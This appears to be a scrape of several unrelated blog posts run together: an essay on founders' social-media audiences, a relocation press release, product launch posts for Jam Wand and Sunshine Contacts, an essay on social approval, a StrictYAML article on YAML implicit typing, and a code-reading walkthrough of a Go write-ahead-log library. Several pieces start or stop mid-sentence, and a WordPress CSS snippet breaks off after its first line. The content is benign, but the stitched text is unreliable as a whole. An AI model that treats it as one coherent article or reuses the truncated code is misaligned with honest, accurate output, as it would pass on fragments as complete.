href="https://www.youtube.com/watch?v=mixsze6uJPg">record videos when you hold it up to your chest</a>? This was an endeavor by Casey Neistat, who had <a href="https://web.archive.org/web/20150809013605/https://www.youtube.com/user/caseyneistat">~1m YouTube subscribers</a>, <a href="https://web.archive.org/web/20150705203923/https://twitter.com/CaseyNeistat">~135k followers on Twitter</a>, and <a href="https://web.archive.org/web/20150813225907/https://instagram.com/caseyneistat/">~400k on Instagram</a> back at the time. Despite accumulating millions of new fans of his own on all platforms ever since and CNN buying Beme in 2016, it eventually shut down in 2018.</p><p>Beme wasn't the only project by Casey that went down. There is also <a href="https://www.368.nyc/about">368</a>, a <em>"place where professional gamers, internet creators and cultural icons meet and create"</em>. Although it is open and operating, it's safe to say it's not what Casey had envisioned for it by far.</p><blockquote><p>[...]<!-- --> building a business is a really slow, really painful process <!-- -->[...]</p><p>-- <cite><a href="https://youtu.be/a49xvHviVds?t=123">Casey Neistat</a></cite></p></blockquote><p>Not convinced yet? Let's reduce the audience down to its purpose: Attention and somewhat targeted reach.</p><p>With this in mind, we can look at the products, which have been spun up and <a href="https://killedbygoogle.com/">eventually killed by yours truly, Google</a>.</p><p>Although Google isn't a person, I think it's a potent example that a social audience isn't tied to a projects' success. Google has millions of followers on all major social media platforms (don't expect me to link the accounts up).</p><p>For emphasis: This is a <a href="https://killedbygoogle.com/">collection of &gt; 200 diverse products</a> by big G itself, an <a href="https://www.theverge.com/2020/1/16/21069458/google-alphabet-trillion-dollar-market-cap-apple-microsoft">ex-1-trillion-net-worth</a> company that made 160 billion in revenue in 2019.</p><p>Each of those products has been likely in development for at least a year, with a dedicated and motivated group of brilliant people working on it. Furthermore, many of those products have been rolled out to Googles' existing audience by integrating them seamlessly into the user experience (Picasa, Google+, Google Reader, Google Video, etc.) or otherwise promoting them with the help of Googles' ecosystem and a bag of serious cash.</p><h2>Medium audience but immense success</h2><p><em>A medium audience in this context ranges from approximately 5-45k. Immense success means that the project is alive and healthy, and the founders can live far beyond their needs, with an ample surplus.</em></p><p>This is a selection of folks with a following that you wouldn't deem overwhelming but still have more to nurture their projects from than the average indie maker. To provide these particular examples significance, I made sure that they had a disproportionate amount of success. I also would like you to pay attention to how their followings became vast <em>after</em> (or should I say <em>while</em>?) building their businesses.</p><p>Probably you didn't expect someone like <a href="https://twitter.com/levelsio">Pieter Levels</a>, who now has an impressive following (currently ~92k on Twitter) and is popular in the industry of online entrepreneurship, to be in this category. However, if you look closely, <a href="https://www.crunchbase.com/organization/remote-ok">at the time Pieter launched RemoteOK</a> in 2015, he <a href="https://web.archive.org/web/20150129205450/https://twitter.com/levelsio">had about 9k followers</a>. I'm not saying that's irrelevant, but I am having trouble to justify <a href="https://remoteok.io/">RemoteOK's</a> success from solely that. <a href="https://www.crunchbase.com/organization/nomad-list">Pieter launched Nomad List</a>, the second startup he is known for, even earlier, in August 2014, when he barely had <a href="https://web.archive.org/web/20140813033726/https://twitter.com/levelsio">4k followers</a> on Twitter. That didn't hinder him to get significant press coverage early on by such as <a href="https://www.inc.com/jessica-stillman/the-best-cities-in-the-world-for-digital-nomads.html">Inc.com</a> or <a href="https://www.businessinsider.in/how-to-find-the-best-places-to-live-when-you-work-remotely/articleshow/39427000.cms">Business Insider India</a>.</p><p><a href="https://twitter.com/yongfook">Jon Yongfook</a> (~18k followers) not only has somewhat of a celebrity status in Singapore, but he also has a noteworthy <a href="https://www.instagram.com/yongfook/">Instagram following</a> (~14k followers). Jon created <a href="https://www.bannerbear.com/">Bannerbear</a> and <a href="https://www.bannerbear.com/open/">discloses his numbers openly</a>. Before Bannerbear, <a href="https://twitter.com/yongfook/status/1304212610204577792">he has "failed"</a> a lot of times, both with <a href="https://twitter.com/yongfook/status/1171311476222464001">zero revenue</a> projects and projects that had <a href="https://blog.yongfook.com/don-t-fail-because-your-marketing-sucks.html">millions raised and hundreds of employees</a>.</p><p><a href="https://twitter.com/shl">Sahil Lavignia</a>, who has accumulated even more followers than Pieter by now (~143k), <a href="https://sahillavingia.com/reflecting">can tell a bizarre story</a> about his company <a href="https://gumroad.com/">Gumroad</a>. He had <a href="https://web.archive.org/web/20120130074352/https://twitter.com/shl">~9k followers</a> when he got funded in the millions around 2011-2012. Although I have been on Twitter at that time I fail to remember how influential numbers like this were back then. In the darkest hours of Gumroad, around November 2015, Sahil had grown his audience to <a href="https://web.archive.org/web/20151129034039/https://twitter.com/shl">~17k followers</a>. Another three years later, in November 2018, he had <a href="https://web.archive.org/web/20180208231910/https://twitter.com/shl">~20k followers</a> when Gumroad slowly <a href="https://sahillavingia.com/reflecting">started to rehabilitate from its prior downturn</a>.</p><p>Nowadays, you can't browse Twitter even for a minute without seeing a Gumroad link popping up somewhere. But Sahil jumped from success to failure and back with each transition taking years and rather moderately growing his Twitter audience. I'd argue his Twitter presence never played a critical role in his business' following success: To this date, his followers presumably view him more as the daily source of wise life advice than as the CEO of Gumroad.</p><h2>Little to no audience but great success</h2><p><em>Little to no audience in this context is everything less than ~5k followers. Great success means that the project is alive and healthy, and the founders can at least sustain their life financially from the project alone. Note that I did not research how many followers the founders in this category had at launch time because they fell into the given range even at the time of writing. But, naturally, you can assume it was even less.</em></p><p>On the other side, there are those who have no large audience and succeeded at their business. These folks are laser-focusing on building their business, not on building an audience for their business.</p><p>Because it's easy to find successful products of founders who don't have a large audience (hint: Look for cool products, the founders are almost always small on social media), here are more examples:</p><p><a href="https://twitter.com/arichaprasad">Richa Prasad</a> (~40 followers) and <a href="https://twitter.com/lucygliang">Lucy Liang</a> (~450 followers) offer online weight loss coaching on <a href="https://www.coachviva.com/">Coach Viva</a> and have recently hit $10k monthly average. I love how they've managed to get a common idea to work <a href="https://www.indiehackers.com/interview/the-long-road-to-10k-in-30-days-414169d6b8">with smart, sequential marketing efforts</a>. For example, they started out with their personal network, made adjustments to the product itself based on feedback, cemented their authenticity with reviews, and eventually landed on <a href="https://www.youtube.com/channel/UCQjOVgcoZvC6-EK0xgankpQ">YouTube</a>.</p><p><a href="https://twitter.com/brettwill1025">Brett Williams</a> is virtually non-existent on social media but has had tremendous success building <a href="https://www.designjoy.co/">designjoy.co</a>), a productized service where he sells web design on a monthly subscription. With that, Brett is <a href="https://www.indiehackers.com/product/hue">reporting to make $26k MRR</a> and has recently crossed <a href="https://www.indiehackers.com/post/hit-400k-as-a-solo-founder-designjoy-update-35af18ab82">$400k in total revenue</a>. The project is about three years old at the time of writing.</p><p><a href="https://twitter.com/sarahhum">Sarah Hum</a> (~4k followers) and <a href="https://twitter.com/a13n">Andrew Rasmussen</a> (~1.5k followers) are the founders of <a href="https://canny.io/">Canny</a>, a crowd-feedback tool used by large brands and tools like <a href="https://ahrefs.canny.io/">ahrefs</a>, <a href="https://react-native.canny.io/feature-requests">React Native</a>, and even <a href="https://netflix.canny.io/">Netflix</a>. Although Canny has <a href="https://www.indiehackers.com/product/canny/1m-arr-milestone--MFew44ybD_39HOGO_N7">recently hit $1m ARR</a>, neither Sarah nor Andrew have an exceptional social media following. <a href="https://canny.io/blog/how-we-built-a-1m-arr-saas-startup/">They found success in strategies</a> like content marketing, cold outreach, and putting effort into a great launch on <a href="https://www.producthunt.com/posts/canny-3">Product Hunt</a>.</p><p><a href="https://twitter.com/linuz90">Fabrizio Rinaldi</a> (~4k followers) and <a href="https://twitter.com/frankdilo">Francesco Di Lorenzo</a> (~2,5k followers) are building <a href="https://mailbrew.com/">Mailbrew</a>, an all-in-one email digest for all your favorite news and updates in one place.

Some had to put their plans moving abroad on hold or even cancel the whole idea of relocating due to the ongoing pandemic. But do they really forego their dreams of relocating to a foreign country and let the coronavirus pandemic destroy their plans?

A survey <a href="https://housinganywhere.com/international_students_and_young_professionals_overcome_corona_fears_to_pursue_dreams_of_moving_abroad" target="_blank" rel="noopener">by HousingAnywhere </a>done <!-- -->between June to August 2020 and January 2020 involving 110 respondents from various countries globally, found that international students and young professionals still have the interest to relocate abroad. The survey reported that 65% of the respondents are keen to move even with concerns <!-- -->about<!-- --> their safety and health during this pandemic. <!-- --> <!-- -->Out of this group of respondents, 30% said that they are looking to move as soon as possible, <!-- -->9.1% said ‘Yes, but not until late 2020’, another 6.4% said 'Yes, but not until early 2021'. 10% said they are looking at a different time-frame due to work or university deadlines.<!-- --> </span></p><p id="viewer-651k2"><span>While they are determined not to let the pandemic crush their dreams of moving abroad, they recognize the need for comprehensive information such as a country's medical procedures and travel options. HousingAnywhere, emphasized that young people planning to move abroad need this information <!-- -->to have control over their movement and well-being while living in a foreign country.</span></p><p id="viewer-52tgc"><span>Having access to the right and in-depth information is crucial and necessary for those still pursuing their dream of studying or working abroad. While there are many available governments, expats, or blog sites online, there is hardly any one-stop online interactive platform providing all relevant information to this group of people, especially international students. </span></p><p id="viewer-15dsb"><span>Without a doubt, a one-stop platform in the form of a global online community can be one of the best tools to support and educate everyone who is looking to move abroad. Hence, NeuXP Group, a digital banking platform provider, will be launching a global community online platform called NeuCommunity (<a href="http://www.neuxp.com/neucommunity" target="_blank" rel="noopener">www.neuxp.com/neucommunity</a>) in Q4 of 2020 to lessen the pain of searching for the right information from too many different online sites. </span></p><p id="viewer-15ohk"><span>NeuCommunity, a free online social platform, is designed to connect millions of people worldwide, including subject matter experts, where they can engage and share information about all things relevant to studying or working abroad.

            <section>
                <div>
                    <p>Today we are excited to launch the beta for Jam Wand -- with it, you can click on any text in your live website, edit it, and submit the change to GitHub to be merged into the code. It just launched in beta today, and you can sign up at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/SXjlHrFlWNQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Jam Wand is the tool <a href="https://twitter.com/_irtefa">Irtefa</a> and I wished we had when we were product managers at Cloudflare. We used to spend too much engineering time changing copy. We felt bad asking engineers for yet another copy change, and engineers felt bad because checking out yet another copy-fixes branch is time consuming and boring. It was a lose-lose.</p><p>We wished changing copy on a website was as easy as changing copy in a Google Doc. That was the goal for building Jam Wand.</p><p>With Jam Wand, any non-technical member of the team - without dealing with code or git - can make copy changes to their live website. It opens up pull requests to the codebase, so all engineers have to do is review and merge, and the copy change is live. </p><p>We know it’s cheesy, but we used to be PMs, we love building products and our dream is to help product teams work better together and build better products, faster. </p><p>We think collaborative teams where everyone can contribute what they do best -- where customer support can update in-product help text, marketing can update landing page copy, dev rel can update developer docs, sales can update CTA text, and so on, leads to better products - which makes teams happy, users happy, it is a win-win.</p><h2 id="how-jam-wand-has-changed-our-workflow"><strong>How Jam Wand has changed our workflow</strong></h2><p>We built the Jam Wand website using Jam Wand (I know, you are very surprised). But it actually changed our workflow -- we didn’t have to have copy ready for engineering before they built the site. Instead, an engineer created the website scaffold with some placeholder text, and then deployed it, and once it was live, I could go in and write in the copy, right from the live website.</p><h2 id="a-new-way-to-build-and-maintain-documentation"><strong>A new way to build and maintain documentation</strong></h2><p>What we experienced at Cloudflare and what Jam users tell us, is that while all website copy is a challenge to update, developer documentation sites are a special challenge.</p><p>It’s too hard to suggest a fix to documentation (just explaining where the change should be in the docs site takes effort), and then to make the change, it has to be Jira-ed and scheduled into an engineering sprint. And so, many changes to docs that would improve the developer experience often aren’t made because there is too much overhead.</p><p>Jam transforms your developer documentation site into a collaborative workspace, like a Google Doc. And now, with Jam Wand, you can even change the copy right from the page, making it so that anyone can help improve your developer documentation. We’re excited for what that means for docs especially.</p><h2 id="can-t-wait-to-hear-what-you-think"><strong>Can’t wait to hear what you think</strong></h2><p>You can sign up for the beta at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><p>There’s a queue, but we want to prioritize bringing in people who care about collaboration and no-code workflows, who can help us shape the future of the product. You’ve read all the way to the end here, so it’s likely that’s you 😁 -- DM us <a href="https://twitter.com/scoopsofjam">@scoopsofjam</a> your waitlist # and we will try to bring you in early!</p><p>And lastly - Jam Wand was built by <a href="https://twitter.com/_cichocinski">Tomasz Cichociński</a>, and designed by <a href="http://gloriayanli.com/">Gloria Li</a>. Just wanted to give them a little shout here 🤩 &nbsp;go Tomasz and Gloria!<br></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>Knowing who is in control</h2>
<p>There are too many writers that want to please their audience too much. </p>
<p>They try to come up with the topics that the reader would click on in the newsletter. They come up with words and sentences that put the writer in a good light. They do everything not to be judged and to be respected and envied.</p>
<p>This is a prevalent trend you see all around the internet. It applies to the small bloggers that have grown just a little bit, and also it applies to huge bloggers that have understood that real people are reading your writing on the other side.</p>
<p>This does not only apply to writing. It applies to public speaking, videos on topics, ADs campaigns and ever software.</p>
<h2>Software to please</h2>
<p>Most of the people when choosing what side project to build go through ups and downs and turns in their mind before starting to work. It is a gad damn rollercoaster.</p>
<p>One of the things the developer decides is, how will he be judged when he presents this product. Would he be congratulated and told how awesome this product is, or would he be booed and shamed for making such an app?</p>
<p>You might not realise, but that is the main factor that stops some amazingly bright folks from building things.</p>
<h2>Where it all started</h2>
<p>One of the indications of how successful you are right now is how many followers you have on each social network and how much engagement do your posts get.</p>
<p>That is a very slippery slope.</p>
<p>Do you that also base your social interactions subconsciously on this understand what are likes and how they are acquired?</p>
<p>You have users, and these users have interests. These interests are determining who they follow based on the content of the different profiles. This content is liked, shared and saved if it fills other peoples area of interest.</p>
<p>So what are trying to do when posting there? Trying to please others interest and boost their well being.</p>
<p>I think it is evident what this means to normal humans, right? It means that we get programmed that we need to please others to get social approval. We are becoming more and more, just like in the old tribe days. Get accepted with followers or likes, or die as an outcast doing something that no-one agrees and understands.</p>
<p><img alt="like vs you image heart" src="https://i.gyazo.com/fec32c0e74acb32eb7bca4b52a4c1e74.png"></p>
<h2>Going forward</h2>
<p>It is very interesting how will the world change with the outcomes coming from Covid, but one thing certain is that we got even more integrated with social networks. When you are scared of leaving your home, and by nature, we still require social interactions, you seek some enjoyment out from social networks. So guess what? You get even more addicted to it.</p>
<p>None of this is good or healthy. No way that people can switch off from the mentality they got while socially living in social networks every day, for most of the day.</p>
<p>One way that the world can change if more limits are put on to social networks in general. Once that is done, the social norm and acceptance of the hole social networks market can go down just a little bit. That should be enough to get early adopters onto other platforms that have no likes and other things that get you trapped in a vicious cycle.</p>
<p>Once those vocal adopters get in, it is only a matter of time until the world changes again. It has happened before, and there is no way for history to be different now.</p>
<p>My personal hope is that we all stop doing content and work for others and start doing it for ourselves. That will help us produce higher quality and very personal work. That way, humanity can grow, not degrade.</p>
<p>As always you can try right now, no-one is stopping you:</p>
<p>Start now. Get perfect later</p>

<p>To keep things streamlined with WordPress, I had to implement this hack the other day, where I wanted to disable tag links on just 1 page.</p>
<p>Instead of fiddling with a new plugin, I found it easier, in this case, to disable the link in the template engine with pure CSS.</p>
<p>The magic to remove the link feature lies in <code>pointer-events</code> while the rest ensures it doesn't look like one.</p>
<pre><code><span>a</span><span>.disabled</span> {

					<div><p>How do you make the mundane magical?&nbsp; Imagine if your contacts magically stayed up-to-date with no effort on your part.&nbsp; Or if the great photos you have of your friends got sent to them automatically. What if you never forgot another birthday?</p>

<p>The impossible is now possible. Smartphones have connected the world and put the entire internet into our pockets. We can get whatever we want delivered to our home whenever we want, sometimes by flying drone. With the rise of artificial intelligence, dreams of virtual assistants, self-driving cars and global facial recognition are no longer that far-fetched. However, despite transformational advances in technology, there are still tons of mundane, time-consuming tasks that we all do (or just don’t do) daily.<br><span><br><b>Sunshine’s technology will make the mundane effortless, free up your time, and make it easier to be thoughtful.</b></span></p>
<p><span>Every day, we muddle through tasks with technology that is “good enough” – contacting friends with stale information that may or may not reach them; searching through email for phone numbers and addresses that we know we have somewhere; manually and painstakingly creating group distribution lists for every occasion; scheduling time to get together with friends using a hodge-podge of calendar, email, and text; pinching and zooming through photos to find one with everyone’s eyes open. We’re used to the mess, and we’ve come to accept the friction.&nbsp;</span></p>

<p>No more.&nbsp; Everyday things should <b>just work</b>, and that’s Sunshine’s mission. We’re creating technology to address practical, everyday pain points in the basic, foundational tools that connect us with the people we care about. Ultimately, Sunshine will remove complexity in things like contact management, scheduling, event organization, and group communication so you can spend time more meaningfully.</p>

<p>We want to put the focus back on people, and let technology advance in its sophistication and fade into the background.</p>

<p>Today, we’re launching Sunshine Contacts (see our announcement here). Leveraging the power of artificial intelligence, Sunshine Contacts finds, deduplicates, and organizes your contacts. Using a variety of sources, we ensure your contact list is in one place, organized, always complete, and up-to-date.&nbsp; Sunshine Contacts makes your contacts <b>just work</b>.</p>

<p>Sunshine Contacts is our foundation. When your contacts are organized and truly work, they create a flywheel where scheduling, planning, organizing, and being thoughtful about your relationships becomes infinitely easier. When your contacts are complete, comprehensive, and accurately reflect relationships, you can spend your time building meaningful connections and shared experiences. Our future suite of products will make it effortless to keep in touch with the people in your life on a personal and professional level in a thoughtful way.</p>

<p>This is just the beginning.&nbsp; Sunshine is building a suite of services to solve the common pain points that modern technology hasn’t addressed.</p>

<p>At Sunshine, we strive to make the mundane magical. Our vision is to support your day-to-day life – to eliminate time spent on “technology” and simply make things better.&nbsp; Easier.&nbsp; If this means you save some “screen time” and give more thought to the most important people in your life, then we’ll know we’ve done it right.</p>

<p>We can’t wait to show you what’s next.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
		<div>
			

			

<p>A while back I met an old coworker and he started telling me about this
interesting bug he faced:</p>

<p>“So, we started internationalizing the website by creating a config
file. We added the UK, Ireland, France and Germany at first.”</p>
<div><pre><code data-lang="yaml">countries<span>:</span><span>
</span><span></span>-<span> </span>GB<span>
</span><span></span>-<span> </span>IE<span>
</span><span></span>-<span> </span>FR<span>
</span><span></span>-<span> </span>DE</code></pre></div>
<p>“This was all fine. However, one day after a quick configuration change
all hell broke loose. It turned out that while the UK, France and
Germany were all fine, <em>Norway</em> was <em>not</em>…”</p>

<p>“While the website went down and we were losing money we chased down
a number of loose ends until finally finding the root cause.”</p>

<p>“If turned out that if feed this configuration file into
<a href="http://pyyaml.org/">pyyaml</a>:”</p>
<div><pre><code data-lang="yaml">countries<span>:</span><span>
</span><span></span>-<span> </span>GB<span>
</span><span></span>-<span> </span>IE<span>
</span><span></span>-<span> </span>FR<span>
</span><span></span>-<span> </span>DE<span>
</span><span></span>-<span> </span>NO</code></pre></div>
<p>“This is what you got in return:”</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>from</span> <span>pyyaml</span> <span>import</span> <span>load</span>
<span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>the_configuration</span><span>)</span>
<span>{</span><span>'countries'</span><span>:</span> <span>[</span><span>'GB'</span><span>,</span> <span>'IE'</span><span>,</span> <span>'FR'</span><span>,</span> <span>'DE'</span><span>,</span> <span>False</span><span>]}</span></code></pre></div>
<p>It snows a <em>lot</em> in False.</p>

<p>When this is fed to code that expects a string of the form ‘NO’,
then the code will usually break, often with a cryptic error,
Typically it would be a KeyError when trying to use ‘False’
as a key in a dict when no such key exists.</p>

<p>It can be “quick fixed” by using quotes - a fix for sure, but
kind of a hack - and by that time the damage is done:</p>
<div><pre><code data-lang="yaml">countries<span>:</span><span>
</span><span></span>-<span> </span>GB<span>
</span><span></span>-<span> </span>IE<span>
</span><span></span>-<span> </span>FR<span>
</span><span></span>-<span> </span>DE<span>
</span><span></span>-<span> </span><span>'NO'</span></code></pre></div>
<p>The most tragic aspect of this bug, howevere, is that it is
<em>intended</em> behavior according to the YAML 2.0 specification.
The real fix requires explicitly disregaring the spec - which
is why most YAML parsers have it.</p>

<p>StrictYAML sidesteps this problem by ignoring key parts of the
spec, in an attempt to create a “zero surprises” parser.</p>

<p><em>Everything</em> is a string by default:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span>
<span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>the_configuration</span><span>)</span><span>.</span><span>data</span>
<span>{</span><span>'countries'</span><span>:</span> <span>[</span><span>'GB'</span><span>,</span> <span>'IE'</span><span>,</span> <span>'FR'</span><span>,</span> <span>'DE'</span><span>,</span> <span>'NO'</span><span>]}</span></code></pre></div>
<h2 id="string-or-float">String or float?</h2>

<p>Norway is just the tip of the iceberg. The first time this problem hit me
I was maintaining a configuration file of application versions. I had
a file like this initially - which caused no issues:</p>
<div><pre><code data-lang="yaml">python<span>:</span><span> </span><span>3.5</span>.<span>3</span><span>
</span><span></span>postgres<span>:</span><span> </span><span>9.3</span>.<span>0</span></code></pre></div>
<p>However, if I changed it <em>very</em> slightly:</p>
<div><pre><code data-lang="yaml">python<span>:</span><span> </span><span>3.5</span>.<span>3</span><span>
</span><span></span>postgres<span>:</span><span> </span><span>9.3</span></code></pre></div>
<p>I started getting type errors because it was parsed like this:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>from</span> <span>ruamel.yaml</span> <span>import</span> <span>load</span>
<span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>versions</span><span>)</span> <span>==</span> <span>[{</span><span>"python"</span><span>:</span> <span>"3.5.3"</span><span>,</span> <span>"postgres"</span><span>:</span> <span>9.3</span><span>}]</span>    <span># oops those *both* should have been strings</span></code></pre></div>
<p>Again, this led to type errors in my code. Again, I ‘quick fixed’ it with quotes.
However, the solution I really wanted was:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span>
<span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>versions</span><span>)</span> <span>==</span> <span>[{</span><span>"python"</span><span>:</span> <span>"3.5.3"</span><span>,</span> <span>"postgres"</span><span>:</span> <span>"9.3"</span><span>}]</span>    <span># that's better</span></code></pre></div>
<h2 id="the-world-s-most-buggy-name">The world’s most buggy name</h2>

<p><a href="http://www.wired.com/2015/11/null">Christopher Null</a> has a name that is
notorious for breaking software code - airlines, banks, every bug caused
by a programmer who didn’t know a type from their elbow has hit him.</p>

<p>YAML, sadly, is no exception:</p>
<div><pre><code data-lang="yaml">first<span> </span>name<span>:</span><span> </span>Christopher<span>
</span><span></span>surname<span>:</span><span> </span>Null</code></pre></div><div><pre><code data-lang="python"><span># Is it okay if we just call you Christopher None instead?</span>
<span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>name</span><span>)</span> <span>==</span> <span>{</span><span>"first name"</span><span>:</span> <span>"Christopher"</span><span>,</span> <span>"surname"</span><span>:</span> <span>None</span><span>}</span></code></pre></div>
<p>With StrictYAML:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span>
<span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>name</span><span>)</span> <span>==</span> <span>{</span><span>"first name"</span><span>:</span> <span>"Christopher"</span><span>,</span> <span>"surname"</span><span>:</span> <span>"Null"</span><span>}</span></code></pre></div>
<h2 id="type-theoretical-concerns">Type theoretical concerns</h2>

<p>Type theory is a popular topic with regards to programming languages,
where a well designed type system is regarded (rightly) as a yoke that
can catch bugs at an early stage of development while <em>poorly</em>
designed type systems provide fertile breeding ground for edge case
bugs.</p>

<p>(it’s equally true that extremely strict type systems require a lot
more upfront and the law of diminishing returns applies to type
strictness - a cogent answer to the question “why is so little
software written in haskell?“).</p>

<p>A less popular, although equally true idea is the notion that markup
languages like YAML have the same issues with types - as demonstrated
above.</p>

<h2 id="user-experience">User Experience</h2>

<p>In a way, type systems can be considered both a mathematical concern
and a UX device. In the above case</p>

<p>In the above, and in most cases, implicit typing represents a major violation
of the UX <a href="https://en.wikipedia.org/wiki/Principle_of_least_astonishment">principle of least astonishment</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Developers often talk about improving our ability to write code. Few of us talk about getting better at <em>reading</em> code. I believe that just as we can improve at reading fiction and non-fiction via various <a href="https://fs.blog/how-to-read-a-book/">techniques</a>; we can do the same for our code-reading faculties. And just as we can judge reading quality by looking at speed, comprehension and syntopical understanding, we can apply the same metrics to reading code. Given that I probably read around 3 times more code than I write, this is an area I definitely want to work on.</p><p>In this article I will explore some techniques and tactics I use when diving into a new codebase. I chose <a href="https://github.com/tidwall/wal">github.com/tidwall/wal</a> as an example. This is a small Golang library that implements <a href="https://en.wikipedia.org/wiki/Write-ahead_logging">write-ahead logging</a>. Write Ahead Logs are used to provide data integrity in applications. Such applications typically write undo/redo data or some other state into the log before performing an actual change (hence the name). Note that before this exercise I had never given any thought to the design and implementation of write-ahead logs.</p><h2 id="my-three-guidelines-when-reading-code">My three guidelines when reading code</h2><ol><li>Examine the API / public interfaces/</li><li>If possible, play around with the exposed interfaces of the code in question.<ol><li>If not possible, look at the unit tests. When there is little or no documentation, unit tests can tell us how the author meant for the library to be used.</li></ol></li><li>When looking at internals, always look at the data structures first. <label for="1"></label>
<span id="1">I learnt this from https://jameskoppelcoaching.com/advanced-software-design-web-course, which I highly recommend</span></li></ol><h2 id="diving-in">Diving in</h2><p>So the first thing I will do is to create a small program to call the library:</p><figure><img src="https://www.iantay.dev/23/wal-demo.png"></figure><p>Right off the bat, this lets me see how the logs are being stored on disk. Interesting! So we see that a log is stored in a single directory, spread across files with numbered filenames. Calling the truncate function sometimes causes these files to be deleted.</p><p>I’m satisfied with the results of my experimentation, so I’ll skip looking at the unit tests.</p><p>Next thing is to look at the code. In this smallish library, the key file to look at is <code>wal.go</code>. The author has nicely left the core data structures at the top of the file, along with some commentary:</p><div><pre><code data-lang="go"><span>// Log represents a write ahead log
</span><span></span><span>type</span> <span>Log</span> <span>struct</span> {
	<span>mu</span>         <span>sync</span>.<span>RWMutex</span>
	<span>path</span>       <span>string</span>      <span>// absolute path to log directory
</span><span></span>	<span>opts</span>       <span>Options</span>     <span>// log options
</span><span></span>	<span>closed</span>     <span>bool</span>        <span>// log is closed
</span><span></span>	<span>corrupt</span>    <span>bool</span>        <span>// log may be corrupt
</span><span></span>	<span>segments</span>   []*<span>segment</span>  <span>// all known log segments
</span><span></span>	<span>firstIndex</span> <span>uint64</span>      <span>// index of the first entry in log
</span><span></span>	<span>lastIndex</span>  <span>uint64</span>      <span>// index of the last entry in log
</span><span></span>	<span>sfile</span>      *<span>os</span>.<span>File</span>    <span>// tail segment file handle
</span><span></span>	<span>wbatch</span>     <span>Batch</span>       <span>// reusable write batch
</span><span></span>	<span>scache</span>     <span>tinylru</span>.<span>LRU</span> <span>// segment entries cache
</span><span></span>}

<span>// segment represents a single segment file.
</span><span></span><span>type</span> <span>segment</span> <span>struct</span> {
	<span>path</span>  <span>string</span> <span>// path of segment file
</span><span></span>	<span>index</span> <span>uint64</span> <span>// first index of segment
</span><span></span>	<span>ebuf</span>  []<span>byte</span> <span>// cached entries buffer
</span><span></span>	<span>epos</span>  []<span>bpos</span> <span>// cached entries positions in buffer
</span><span></span>}
</code></pre></div><p><a href="https://sourcegraph.com/github.com/tidwall/wal@master/-/blob/wal.go#L91">[sourcegraph]</a></p><p>Just from examining the data structures we can already see the following:</p><ul><li>This log file is divided into segments - so that’s what we saw earlier!</li><li>Each segment starts at an index, and has an associated cache for the byte positions of every element index.</li><li>The log itself has an associated cache with a Least-Recently-Used eviction policy.</li><li>The log can be marked as corrupt - which probably means that there is some recovery mechanism.</li></ul><p>At this point, if you have a specific question you want answered from the code, you can dive into the function internals. Personally, I want to find out why segmented file storage was chosen (instead of storing everything in a single file for instance).</p><p>The mutex catches my eye here, since it suggests a tradeoff between parallelism and safety. Looking at references to the mutex I can see that:</p><ul><li>Many operations including <code>Write*</code> and <code>Truncate*</code> acquire a writer lock on the entire log before writing.</li><li>This indicates that writes are sequential - which makes sense since this is an append-only log.</li></ul><p>At this point I want to know a bit more about segments; so I do a quick Google search. So apparently, one benefit of working with multiple segments (files) is that it becomes easier to truncate entries from the log. So it makes sense for us to a look at the <code>Truncate*</code> methods.</p><p>Cool! These methods are implemented with a pattern that is new for me: critical work is front-loaded into the initial portion of the function <a href="https://sourcegraph.com/github.com/tidwall/wal@master/-/blob/wal.go#L738">[sourcegraph]</a>. Later on in the function, non-critical operations (deleting the unused segments, which can take a relatively long time) happen. If any error happens at this point of the function, the disk data is preserved and can be re-loaded correctly later on.</p><p>Lastly, lets look at the <code>Read</code> and <code>load</code> functions. This is where I find that reads are actually quite optimized. When loading a log, only the last segment is read from disk by default <a href="https://sourcegraph.com/github.com/tidwall/wal@master/-/blob/wal.go#L253">[sourcegraph]</a>. Any segment that is not cached in memory will be read from disk on-demand (e.g. in <a href="https://sourcegraph.com/github.com/tidwall/wal@master/-/blob/wal.go#L582"><code>loadSegment</code></a> we see some of this caching behavior).</p><p>So here we are: an 1 hour later and a lot wiser :) Hope this article was useful - as usual, do reach out if you have any ideas, critiques or comments. One extra tip is to use an IDE(or else something like SourceGraph). Two features that make it much easier to explore a new code base are <code>Jump To Reference</code> and <code>View References</code>.</p></section></div>]]>

        <small>2020-11-18</small>
        <p>I’ve been mostly happy using a Mac since I got myself my first computer earned with programmer money. I believe it was a mid 2009 15" MacBook Pro. That was a computer I used at least until 2016 which I consider very decent usable life. At that point I had replaced the hard-drive with an SSD, upgraded the RAM and switched a battery that was worn out. I stopped using it when it just straight died some time in 2016.</p>
<h2 id="my-history-with-the-mac">My history with the Mac</h2>
<p>So what was that computer to me? It was an extremely well-built and solid-feeling piece of aluminium. A cool keyboard backlight. The magsafe charger and a bunch of USB ports. The keyboard and touchpad were best in class. The build quality was better than any laptop I had owned before. Partly because I had only bought the cheap ones before but also because they really were a step above at the time.</p>
